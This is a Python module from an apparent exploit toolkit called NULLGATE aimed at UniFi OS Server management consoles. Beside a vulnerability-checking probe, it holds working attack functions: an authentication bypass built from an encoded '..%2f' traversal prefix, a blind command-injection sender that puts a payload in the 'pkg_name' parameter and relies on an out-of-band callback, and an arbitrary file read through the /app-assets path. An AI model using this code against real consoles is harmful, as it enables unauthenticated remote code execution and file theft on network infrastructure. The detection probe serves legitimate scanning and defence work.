#!/usr/bin/env python3
"""Verbatim-URI HTTP transport and safety probe for NULLGATE.

The whole primitive depends on one thing: nginx authorizes on the *raw*
request-target but routes on the *normalized* one. Any HTTP client that
decodes ``%2f`` or collapses ``../`` destroys the bug. So we hand the path
straight to ``http.client`` with no normalization at all.

Public research this implements (all CVEs CVSS 10.0, CISA KEV):
  * CVE-2026-34908 / 34909 - auth gateway bypass (raw vs normalized URI)
  * CVE-2026-34910         - unauthenticated command injection (pkg_name)
  * CVE-2026-34909         - /app-assets/ path traversal file read

Sources:
  https://bishopfox.com/blog/popping-root-on-unifi-os-server-unauthenticated-rce-chain-detection-analysis
  https://github.com/BishopFox/CVE-2026-34908-check
  https://github.com/Boreas37/CVE-2026-34910-PoC
"""

from __future__ import annotations

import http.client
import ssl
from urllib.parse import urlencode

DEFAULT_PORT = 11443

# The auth-exempt raw prefix plus an encoded traversal. Kept as a literal so
# %2f is never decoded before it reaches the wire.
TRAVERSAL = "/api/auth/validate-sso/..%2f..%2f..%2f"
PACKAGE_UPDATE = "proxy/users/api/v2/ucs/update/latest_package"
BYPASS_UPDATE = TRAVERSAL + PACKAGE_UPDATE
BASELINE_UPDATE = "/" + PACKAGE_UPDATE

# The vulnerable handler's "missing parameter" response. Reaching it proves the
# bypass landed on the sink without running a command.
VULN_HANDLER_MARKERS = ("pkg_name", "CODE_SYSTEM_ERROR", "parameters are invalid")

# Root-page markers that positively identify a UniFi OS management console.
UOS_MARKERS = (
    "<title>UniFi OS</title>",
    "window.UNIFI_OS_MANIFEST",
    'id="portal-root"',
    'id="site-manager_portal-container"',
)

USER_AGENT = (
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
    "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36"
)


def unverified_context():
    """UniFi consoles ship self-signed certificates."""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def raw_request(host, port=DEFAULT_PORT, path="/", method="GET", headers=None,
                body=None, timeout=8.0, tls=True, max_bytes=65536):
    """Issue one request with the request-target sent exactly as given.

    Returns ``{"status", "body", "headers", "error"}``. Never raises. The
    ``path`` is used verbatim -- do not pre-normalize it.
    """
    out = {"status": 0, "body": "", "headers": {}, "error": ""}
    try:
        if tls:
            conn = http.client.HTTPSConnection(
                host, port, timeout=timeout, context=unverified_context())
        else:
            conn = http.client.HTTPConnection(host, port, timeout=timeout)
        hdrs = dict(headers or {})
        hdrs.setdefault("User-Agent", USER_AGENT)
        conn.request(method, path, body=body, headers=hdrs)
        resp = conn.getresponse()
        data = resp.read(max_bytes)
        out["status"] = resp.status
        out["body"] = data.decode("utf-8", "replace")
        out["headers"] = {k.lower(): v for k, v in resp.getheaders()}
        conn.close()
    except Exception as exc:  # noqa: BLE001 - a scan must never crash on one host
        out["error"] = str(exc)
    return out


def bypass_path(endpoint=PACKAGE_UPDATE, params=None):
    """Build an auth-bypass request-target with optional query parameters."""
    path = TRAVERSAL + endpoint
    if params:
        path += "?" + urlencode(params)
    return path


def file_read_path(path):
    """CVE-2026-34909: /app-assets alias traversal to an arbitrary file."""
    encoded = "/".join("..%2f" for _ in range(6))
    return TRAVERSAL + "app-assets/users/" + encoded + str(path).lstrip("/")


def is_unifi_os(host, port=DEFAULT_PORT, timeout=8.0, tls=True):
    r = raw_request(host, port, "/", timeout=timeout, tls=tls, max_bytes=131072)
    return any(m in r["body"] for m in UOS_MARKERS), r


def safe_probe(host, port=DEFAULT_PORT, timeout=8.0, tls=True):
    """Non-destructive classification. NO command is ever executed.

    Verdicts: VULNERABLE / PATCHED / INCONCLUSIVE / UNAFFECTED / ERROR.
    A positive result means the auth bypass really reached the sink handler.
    """
    result = {"host": host, "port": port, "state": "error", "detail": "",
              "http_status": 0, "baseline_status": 0, "fingerprint": False}

    base = raw_request(host, port, BASELINE_UPDATE, timeout=timeout, tls=tls)
    result["baseline_status"] = base["status"]

    probe = raw_request(host, port, BYPASS_UPDATE, timeout=timeout, tls=tls)
    status = probe["status"]
    result["http_status"] = status
    reached = status == 200 and any(m in probe["body"] for m in VULN_HANDLER_MARKERS)

    if probe["error"] and not status:
        result["detail"] = probe["error"]
        return result

    if reached:
        result["state"] = "vulnerable"
        if base["status"] == 401:
            result["detail"] = ("auth bypass reached the vulnerable handler; "
                                "baseline correctly 401 (no command executed)")
        else:
            result["detail"] = ("auth bypass reached the vulnerable handler; "
                                "baseline=%s (review)" % base["status"])
        return result

    if status == 400:
        result["state"] = "patched"
        result["detail"] = ("nginx rejected the raw/normalized divergence "
                            "(HTTP 400) - 5.0.8+ behavior")
        return result

    fp, _ = is_unifi_os(host, port, timeout=timeout, tls=tls)
    result["fingerprint"] = fp
    if status == 401:
        if fp:
            result["state"] = "inconclusive"
            result["detail"] = "bypass blocked / auth enforced (401) on a UniFi OS host"
        else:
            result["state"] = "unaffected"
            result["detail"] = "HTTP 401 but no UniFi OS fingerprint - not a UniFi OS Server"
        return result

    if fp:
        result["state"] = "inconclusive"
        result["detail"] = "UniFi OS detected, unexpected probe response HTTP %s" % status
    else:
        result["state"] = "unaffected"
        result["detail"] = "no UniFi OS fingerprint on / (probe HTTP %s)" % status
    return result


def send_injection(host, port, command_script, timeout=12.0, tls=True):
    """Send CVE-2026-34910 command injection. Returns the raw HTTP result.

    Deliberately does NOT claim success: the handler is blind and returns HTTP
    200 whether or not the command actually ran. Execution is only confirmed
    out-of-band by the callback collector.
    """
    from . import attack  # local import avoids a cycle
    payload = attack.injection_payload(command_script)
    return raw_request(host, port, bypass_path(params={
        "pkg_name": payload, "by_cmd": "true"}), timeout=timeout, tls=tls)


def read_file(host, port, path, timeout=12.0, tls=True):
    """CVE-2026-34909 arbitrary file read. Returns (ok, text)."""
    r = raw_request(host, port, file_read_path(path), timeout=timeout, tls=tls)
    ok = r["status"] == 200 and len(r["body"]) > 0
    return ok, r["body"]
